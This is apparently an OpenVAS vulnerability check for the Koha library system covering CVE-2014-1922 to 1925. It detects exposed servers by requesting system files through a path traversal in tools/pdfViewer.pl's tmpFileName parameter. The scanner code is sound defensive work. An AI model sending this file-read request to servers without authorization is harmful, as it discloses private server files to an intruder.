###############################################################################
# OpenVAS Vulnerability Test
#
# Koha Multiple Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103904");
  script_cve_id("CVE-2014-1922", "CVE-2014-1923", "CVE-2014-1924", "CVE-2014-1925");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("2020-08-24T15:18:35+0000");
  script_name("Koha Multiple Vulnerabilities");
  script_xref(name:"URL", value:"http://koha-community.org/security-release-february-2014/");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2014-02-10 15:39:58 +0100 (Mon, 10 Feb 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"vuldetect", value:"Try to read a local file via tools/pdfViewer.pl.");

  script_tag(name:"insight", value:"Bug 11660: tools/pdfViewer.pl could be used to read arbitrary files on the server

Bug 11661: the staff interface help editor could be used to modify or create arbitrary
files on the server with the privileges of the Apache user

Bug 11662: member-picupload.pl could be used to write to arbitrary files on the server with
the privileges of the Apache user

Bug 11666: the MARC framework import/export function did not require authentication, and could
be used to perform unexpected SQL commands");

  script_tag(name:"solution", value:"Updates are available.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"Koha is prone to multiple vulnerabilities.");

  script_tag(name:"affected", value:"Koha
< 3.14.3
< 3.12.10
< 3.10.13
< 3.8.23");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");

port = http_get_port( default:80 );

files = traversal_files();

foreach dir( make_list_unique( "/", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/";
  res = http_get_cache( item:url, port:port );

  if( "Log in to Koha" >< res ) {
    foreach file( keys( files ) ) {
      url = dir + '/cgi-bin/koha/tools/pdfViewer.pl?tmpFileName=/' + files[file];
      if( http_vuln_check( port:port, url:url, pattern:file ) ) {
        report = http_report_vuln_url( port:port, url:url );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 0 );
